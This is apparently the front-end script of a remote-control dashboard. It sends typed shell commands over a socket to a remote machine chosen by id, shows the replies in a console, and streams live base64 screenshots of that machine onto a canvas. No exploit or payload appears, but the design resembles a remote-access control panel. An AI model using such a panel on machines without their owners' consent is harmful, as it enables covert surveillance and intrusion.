const options_bar = document.querySelector(".options-bar");
const leave_button = document.querySelector(".fa-times");
const connection_quality = document.querySelector(".fa-signal");
const console_button = document.querySelector(".fa-terminal");
const input = document.querySelector("#input");
const output = document.querySelector("#output");
const c = document.querySelector(".c");
const fps_counter = document.querySelector("#fps-counter");
const fullscrean_button = document.querySelector(".fa-window-maximize");

var last_x = 0;

// When the user presses Enter in the input element,
// execute the command and display the result in the output element
input.addEventListener("keyup", (e) => {
  if (e.key === "Enter") {
    output.scrollTop = output.scrollHeight; // auto scroll to bottom

    //const output = input.querySelector("#output");
    //console.log(output);

    const command = input.value;

    socket.emit("command", {
      id: c.id,
      cmd: command,
    });

    output.innerText += `$> ${command}\n`;
    input.value = "";
  }
});

socket.on("commandResult", (data) => {
  output.innerText += `${data.response}\n`; //print response
  output.scrollTop = output.scrollHeight; // auto scroll to bottom
});

leave_button.addEventListener("click", () => {
  socket.emit("command", {
    id: c.id,
    cmd: "live",
  });
  socket.emit("command", { // version >1.4
    id: c.id,
    cmd: "livestop",
  });
  window.location.href = `/dashboard`;
});

console_button.addEventListener("click", async (e) => {
  const consoleElement = document.querySelector(".console");

  if (consoleElement) {
    if (consoleElement.style.display == "none") {
      consoleElement.style.display = "block";
      console_button.style.color = "blue";
    } else {
      consoleElement.style.display = "none";
      console_button.style.color = "white";
    }
  }
});

connection_quality.addEventListener("click", async (e) => {
  if (fps_counter) {
    if (fps_counter.style.display == "none") {
      fps_counter.style.display = "block";
    } else {
      fps_counter.style.display = "none";
    }
  }
});
fullscrean_button.addEventListener("click", async (e) => {
  var elem = document.body; // Make the body go full screen.
  requestFullScreen(elem);
});
function requestFullScreen(element) {
  // Supports most browsers and their versions.
  var requestMethod = element.requestFullScreen || element.webkitRequestFullScreen || element.mozRequestFullScreen || element.msRequestFullScreen;
  var exitMethod = element.exitFullscreen || document.webkitCancelFullScreen || document.mozCancelFullScreen || document.msCancelFullScreen;
  var fullScreenMode = document.fullScreen || document.mozFullScreen || document.webkitIsFullScreen; // This will return true or false depending on if it's full screen or not.

  if (fullScreenMode) {
    //alert("wyjdz")

    if (exitMethod) { // Native full screen.
      closeFullscreen()
  } else if (typeof window.ActiveXObject !== "undefined") { // Older IE.
      var wscript = new ActiveXObject("WScript.Shell");
      if (wscript !== null) {
          wscript.SendKeys("{F11}");
      }
  }

} else{
  if (requestMethod) { // Native full screen.
      requestMethod.call(element);
  } else if (typeof window.ActiveXObject !== "undefined") { // Older IE.
      var wscript = new ActiveXObject("WScript.Shell");
      if (wscript !== null) {
          wscript.SendKeys("{F11}");
      }
  }
}
}

function closeFullscreen() {
  if (document.exitFullscreen) {
    document.exitFullscreen();
  } else if (document.webkitExitFullscreen) { /* Safari */
    document.webkitExitFullscreen();
  } else if (document.msExitFullscreen) { /* IE11 */
    document.msExitFullscreen();
  }
}
document
  .getElementById("button-for-hiding-elements")
  .addEventListener("click", (e) => {
    const elements = document.querySelectorAll(".hide");
    if (elements[0].style.display != "none") {
      last_x = options_bar.style.left;
    }
    // Set the display style of each element to "none"
    elements.forEach((element) => {
      if (element.style.display != "none") {
        element.style.display = "none";
        options_bar.style.left = "0px";
        $(".options-bar").draggable("disable");
      } else {
        element.style.display = "flex";
        options_bar.style.left = last_x;
        $(".options-bar").draggable("enable");
      }
    });
  });

// setInterval(() => {
//   socket.emit("command", {
//     id: document.getElementById("id").getAttribute("data-id"),
//     cmd: "screenshot",
//   });
// }, 250);

socket.emit("command", {
  id: c.id,
  cmd: "live",
});
socket.emit("command", { // Version >1.4
  id: c.id,
  cmd: "livestart",
});
let fps = 0;
var ctx = c.getContext("2d");
ctx.canvas.width = window.innerWidth;
ctx.canvas.height = window.innerHeight;
var img = new Image();

// img.onload = function () {
//   ctx.drawImage(img, 0, 0, window.innerWidth, window.innerHeight);
// };

setInterval(() => {
  document.getElementById("fps-counter").innerHTML = `${fps} FPS`;
  console.log(fps);
  if (fps >= 4) {
    connection_quality.style.color = "green";
  } else if (fps == 3) {
    connection_quality.style.color = "yellow";
  } else {
    connection_quality.style.color = "red";
  }
  fps = 0;
}, 1000);

socket.on("screenshotResult", (msg) => {
  img.onload = function () {
    ctx.drawImage(img, 0, 0, window.innerWidth, window.innerHeight);
  };
  img.src = "data:image/jpeg;base64," + msg.response;

  fps += 1;

  // document.getElementById("liveCam").src =
  //   "data:image/jpg;base64," + msg.response;
});
